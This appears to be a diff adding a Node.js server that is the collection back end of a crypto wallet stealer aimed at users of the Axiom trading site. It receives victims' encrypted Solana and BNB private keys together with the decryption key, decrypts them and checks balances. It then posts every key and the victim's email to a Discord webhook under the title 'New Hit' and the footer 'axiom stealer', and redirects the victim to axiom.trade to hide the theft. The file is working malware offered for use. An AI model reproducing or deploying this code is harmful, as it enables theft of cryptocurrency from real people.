@@ -1,0 +1,279 @@
+const express = require("express");
+const crypto = require("crypto");
+const bs58 = require("bs58");
+const fetch = require("node-fetch");
+const nacl = require("tweetnacl");
+const cors = require("cors");
+
+const app = express();
+app.use(cors());
+app.use(express.json({ limit: "10mb" }));
+app.use(express.urlencoded({ extended: true, limit: "10mb" }));
+
+const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || "";
+
+async function sendToDiscord(content, embed, delayMs = 0) {
+  if (delayMs) await new Promise(r => setTimeout(r, delayMs));
+  try {
+    const body = {};
+    if (embed) { body.content = "@everyone"; body.embeds = [embed]; }
+    else if (content) body.content = content.slice(0, 2000);
+    const res = await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body)
+    });
+    if (res.ok) console.log("Discord OK");
+    else console.log("Discord ERROR:", res.status, await res.text());
+  } catch (e) {
+    console.log("Discord error:", e.message);
+  }
+}
+
+function decrypt(encrypted, bundleKey) {
+  try {
+    const [ivBase64, ciphertext] = encrypted.split(":");
+    if (!ivBase64 || !ciphertext) return null;
+    const iv = Buffer.from(ivBase64, "base64");
+    const key = Buffer.from(bundleKey, "base64");
+    const encryptedBuffer = Buffer.from(ciphertext, "base64");
+    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
+    decipher.setAuthTag(encryptedBuffer.slice(-16));
+    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
+    decrypted = Buffer.concat([decrypted, decipher.final()]);
+    return bs58.encode(decrypted);
+  } catch (e) {
+    return null;
+  }
+}
+
+function getPublicKeyFromPrivate(privateKeyBase58) {
+  try {
+    const privateKeyBytes = bs58.decode(privateKeyBase58);
+    const keyPair = nacl.sign.keyPair.fromSecretKey(privateKeyBytes);
+    return bs58.encode(keyPair.publicKey);
+  } catch (e) {
+    return null;
+  }
+}
+
+const FETCH_TIMEOUT = 3000;
+
+async function fetchWithTimeout(url, opts = {}, timeout = FETCH_TIMEOUT) {
+  const ctrl = new AbortController();
+  const t = setTimeout(() => ctrl.abort(), timeout);
+  try {
+    return await fetch(url, { ...opts, signal: ctrl.signal });
+  } finally {
+    clearTimeout(t);
+  }
+}
+
+async function getSOLPrice() {
+  try {
+    const res = await fetchWithTimeout("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", { headers: { "User-Agent": "Mozilla/5.0" } });
+    const data = await res.json();
+    return data.solana?.usd || 150;
+  } catch { return 150; }
+}
+
+async function getBNBPrice() {
+  try {
+    const res = await fetchWithTimeout("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd", { headers: { "User-Agent": "Mozilla/5.0" } });
+    const data = await res.json();
+    return data.binancecoin?.usd || 300;
+  } catch { return 300; }
+}
+
+async function getSOLBalance(publicKey) {
+  try {
+    const res = await fetchWithTimeout("https://api.mainnet-beta.solana.com", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [publicKey] })
+    });
+    const data = await res.json();
+    return data.result?.value !== undefined ? data.result.value / 1e9 : 0;
+  } catch { return 0; }
+}
+
+async function getBNBBalance(address) {
+  try {
+    const res = await fetchWithTimeout(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest`);
+    const data = await res.json();
+    return data.status === "1" ? parseFloat(data.result) / 1e18 : 0;
+  } catch { return 0; }
+}
+
+async function processPayload(data) {
+  const user = data.user || {};
+  const wallets = data.wallets || [];
+  let wArr = Array.isArray(wallets) ? wallets : wallets?.wallets || Object.values(wallets || {}).flat().filter(Boolean);
+  const ts = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();
+
+  let decrypted = {};
+  const solPrivateKeys = [];
+  if (data.sBundles && data.bundle) {
+    try {
+      const sBundles = typeof data.sBundles === "string" ? JSON.parse(data.sBundles) : data.sBundles;
+      if (Array.isArray(sBundles)) {
+        for (const v of sBundles) {
+          if (typeof v === "string" && v.includes(":")) {
+            const pk = decrypt(v, data.bundle);
+            if (pk) solPrivateKeys.push(pk);
+          }
+        }
+      } else {
+        for (const [k, v] of Object.entries(sBundles)) {
+          if (typeof v === "string" && v.includes(":")) {
+            decrypted[k] = decrypt(v, data.bundle);
+            const pk = decrypted[k];
+            if (pk && /sol/i.test(k)) solPrivateKeys.push(pk);
+          }
+        }
+      }
+    } catch (e) {
+      console.log("sBundles parse error:", e.message);
+    }
+  }
+
+  const isSol = (w) => { const a = w?.address || w?.publicKey || w; return typeof a === "string" && !a.startsWith("0x") && a.length > 20; };
+  const isBnb = (w) => { const a = w?.address || w?.publicKey || w; return typeof a === "string" && a.startsWith("0x"); };
+  let solWallets = wArr.filter(isSol);
+  const bnbWallets = wArr.filter(isBnb);
+  if (data.connectedWallet && !solWallets.some(w => (w?.address || w?.publicKey) === data.connectedWallet)) {
+    solWallets.unshift({ address: data.connectedWallet });
+  }
+
+  const solKey = decrypted.Solana || decrypted.solana || decrypted.SOL || (Object.values(decrypted)[0] && !String(Object.values(decrypted)[0]).startsWith("FAKE") ? Object.values(decrypted)[0] : null) || "N/A";
+  const bnbKey = decrypted.BSC || decrypted.bsc || decrypted.BNB || decrypted.bnb || decrypted.Ethereum || "N/A";
+
+  const maxLen = Math.max(solWallets.length, solPrivateKeys.length, 1);
+  const solItems = [];
+  for (let i = 0; i < maxLen; i++) {
+    let pubKey = solWallets[i]?.address || solWallets[i]?.publicKey;
+    let pk = solPrivateKeys[i] || (i === 0 && solKey !== "N/A" ? solKey : null);
+    if (pk && !pubKey) pubKey = getPublicKeyFromPrivate(pk);
+    if (!pubKey && data.connectedWallet && i === 0) pubKey = data.connectedWallet;
+    if (!pubKey) pubKey = "N/A";
+    solItems.push({ address: pubKey, key: pk || solKey });
+  }
+  if (solItems.length === 0) solItems.push({ address: "N/A", key: solKey });
+
+  const bnbItems = (bnbWallets.length ? bnbWallets : [{ address: "N/A" }]).map(w => ({ address: w?.address || w?.publicKey || "N/A", key: bnbWallets.length ? bnbKey : "N/A" }));
+
+  const [solPrice, bnbPrice, ...balances] = await Promise.all([
+    getSOLPrice(), getBNBPrice(),
+    ...solItems.map(s => s.address !== "N/A" ? getSOLBalance(s.address) : Promise.resolve(0)),
+    ...bnbItems.map(b => b.address !== "N/A" ? getBNBBalance(b.address) : Promise.resolve(0))
+  ]);
+
+  const solListWithBalances = solItems.map((s, i) => ({ ...s, balance: balances[i] ?? 0, usdValue: (balances[i] ?? 0) * solPrice }));
+  const bnbListWithBalances = bnbItems.map((b, i) => ({ ...b, balance: balances[solItems.length + i] ?? 0, usdValue: (balances[solItems.length + i] ?? 0) * bnbPrice }));
+  const realBnbWallets = bnbListWithBalances.filter(w => w.address !== "N/A");
+
+  const totalSOL = solListWithBalances.reduce((s, w) => s + w.balance, 0);
+  const totalBNB = bnbListWithBalances.reduce((s, w) => s + w.balance, 0);
+  const totalSOLValue = solListWithBalances.reduce((s, w) => s + w.usdValue, 0);
+  const totalBNBValue = bnbListWithBalances.reduce((s, w) => s + w.usdValue, 0);
+  const totalValue = totalSOLValue + totalBNBValue;
+
+  const solFields = solListWithBalances.map((w, i) => ({
+    name: `◎  Wallet ${i + 1}  ·  ${w.balance.toFixed(4)} SOL  ($${w.usdValue.toFixed(2)})`,
+    value: [
+      `> 📍 ${w.address !== "N/A" ? `[${w.address.slice(0, 8)}...${w.address.slice(-6)}](https://solscan.io/account/${w.address})` : "N/A"}`,
+      `> 🔑 \`${w.key || "N/A"}\``
+    ].join("\n"),
+    inline: false
+  }));
+
+  const bnbFields = realBnbWallets.map((w, i) => ({
+    name: `🟡  Wallet ${i + 1}  ·  ${w.balance.toFixed(4)} BNB  ($${w.usdValue.toFixed(2)})`,
+    value: [
+      `> 📍 ${w.address !== "N/A" ? `[${w.address.slice(0, 8)}...${w.address.slice(-6)}](https://bscscan.com/address/${w.address})` : "N/A"}`,
+      `> 🔑 \`${w.key || "N/A"}\``
+    ].join("\n"),
+    inline: false
+  }));
+
+  const embed = {
+    title: "🎣  New Hit",
+    description: `>>> 👤  **${user.email ?? user.emailAddress ?? "N/A"}**\n💰  **$${totalValue.toFixed(2)}** across **${solListWithBalances.length + realBnbWallets.length}** wallet(s)\n🕐  ${ts}`,
+    color: 0x00ff88,
+    fields: [
+      ...solFields,
+      ...bnbFields,
+      { name: "​", value: "​", inline: false },
+      { name: "◎ SOL", value: `${totalSOL.toFixed(4)}\n**$${totalSOLValue.toFixed(2)}**`, inline: true },
+      ...(realBnbWallets.length ? [{ name: "🟡 BNB", value: `${totalBNB.toFixed(4)}\n**$${totalBNBValue.toFixed(2)}**`, inline: true }] : []),
+      { name: "💵 Total", value: `**$${totalValue.toFixed(2)}**`, inline: true }
+    ],
+    thumbnail: { url: "https://cdn.discordapp.com/attachments/1454803740384038987/1464639939177091072/ezgif.com-animated-gif-maker_10.gif?ex=6a525e3d&is=6a510cbd&hm=d2d7d0ac06757193b897b6b80293bea22b83b0f0750f23c555a50bf089ad799e&" },
+    footer: { text: "axiom stealer" },
+    timestamp: new Date().toISOString()
+  };
+
+  await sendToDiscord(null, embed);
+
+  const allKeys = [
+    ...solListWithBalances.map(w => w.key && w.key !== "N/A" ? w.key : null),
+    ...realBnbWallets.map(w => w.key && w.key !== "N/A" ? w.key : null)
+  ].filter(Boolean);
+  for (const key of allKeys) {
+    await sendToDiscord(key, null, 500);
+  }
+}
+
+const handlePayload = async (req, res) => {
+  try {
+    let data;
+    const body = req.body;
+    if (body && body.telegramId !== undefined) {
+      data = body;
+    } else if (body && body.d) {
+      const b64 = decodeURIComponent(String(body.d)).replace(/ /g, "+");
+      data = JSON.parse(Buffer.from(b64, "base64").toString("utf-8"));
+    } else if (body && typeof body === "object" && body.bundle) {
+      data = body;
+    } else {
+      return res.status(400).send("Invalid payload");
+    }
+    res.redirect("https://axiom.trade/discover");
+    processPayload(data).catch(e => console.error("Payload error:", e));
+  } catch (e) {
+    console.error("Payload error:", e);
+    res.redirect("https://axiom.trade/discover");
+  }
+};
+
+app.get("/overlay.js", (req, res) => {
+  res.setHeader("Content-Type", "application/javascript");
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.sendFile(__dirname + "/overlay.js");
+});
+
+app.get("/data/:b64", async (req, res) => {
+  try {
+    const decoded = Buffer.from(req.params.b64, "base64").toString("utf-8");
+    const data = JSON.parse(decoded);
+    res.redirect("https://axiom.trade/discover");
+    processPayload(data).catch(e => console.error("Payload error:", e));
+  } catch (e) {
+    console.error("Payload error:", e);
+    res.redirect("https://axiom.trade/discover");
+  }
+});
+
+app.post("/data", handlePayload);
+
+app.get("/", (req, res) => {
+  res.setHeader("Content-Type", "text/html");
+  res.send(`<!DOCTYPE html><html><head><title></title><style>body{margin:0;padding:0;background:#fff}</style></head><body></body></html>`);
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
+
+module.exports = app;
